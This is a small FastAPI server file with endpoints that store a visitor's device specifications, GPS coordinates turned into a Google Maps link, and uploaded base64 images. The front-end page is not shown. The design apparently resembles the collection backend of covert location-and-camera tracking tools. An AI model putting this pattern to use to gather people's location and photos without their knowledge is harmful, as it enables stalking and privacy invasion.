from fastapi import FastAPI, Request,HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import base64,uuid,json  # For generating unique file names
from fastapi.encoders import jsonable_encoder

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

class ImageData(BaseModel):
    image: str
class Location(BaseModel):
    l1:str
    l2:str
class Device(BaseModel):
    platform:str 
    screen_type:str #land or prottated 
    ram:str
    core:str
    battery:str
    charging:bool
    network_type:str
    network_speed:str
  

@app.get("/", response_class=HTMLResponse)
async def show_page(request: Request):
    return templates.TemplateResponse(
        request=request, name="test.html",)


@app.post("/device_info")
async def get_info(details:Device):
    json_compatible_item_data = jsonable_encoder(details)
    with open("data.json",'w') as file:
        file.write(json.dumps(json_compatible_item_data,indent=8))



@app.post("/send_location")
async def get_location(localtion:Location):
    json_compatible_item_data = jsonable_encoder(localtion)
    json_compatible_item_data["location"]=f'https://www.google.com/maps/search/?q={localtion.l1},{localtion.l2}'
    with open("data.json",'a') as file:
        file.write(json.dumps(json_compatible_item_data,indent=2))
    return {"success":"200"}


@app.post("/upload_images")
async def upload_images(image_data: ImageData):
    try:
        image_data_bytes = base64.b64decode(image_data.image.split(",")[1])
        filename = f"uploaded_image_{uuid.uuid4()}.png"
        with open(filename, "wb") as file:
            file.write(image_data_bytes)
        return {"status": "success", "filename": filename}
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Error processing image: {str(e)}")